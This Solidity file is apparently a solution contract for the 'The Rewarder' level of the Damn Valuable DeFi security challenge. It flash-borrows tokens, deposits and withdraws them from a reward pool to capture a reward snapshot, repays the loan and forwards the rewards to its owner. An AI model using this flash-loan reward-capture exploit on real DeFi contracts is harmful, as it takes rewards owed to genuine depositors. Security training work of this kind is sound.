// SPDX-License-Identifier: MIT


pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";


contract rewarderattack {
    FlashLoanerPool pool;
    DamnValuableToken public immutable liquidityToken;
    TheRewarderPool rewardPool;
    address payable owner;

    constructor( address _pool,address _liquidityTokenAddress,address _rewardPoolAddress,address payable _owner) {
        pool = FlashLoanerPool(_pool);
        liquidityToken = DamnValuableToken(_liquidityTokenAddress);
        rewardPool = TheRewarderPool(_rewardPoolAddress);
        owner = _owner;
    }

    function attack(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewardPool), amount);
        
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        liquidityToken.transfer(address(pool), amount);

        uint256 currBal = rewardPool.rewardToken().balanceOf(address(this));
        rewardPool.rewardToken().transfer(owner, currBal);
    }
}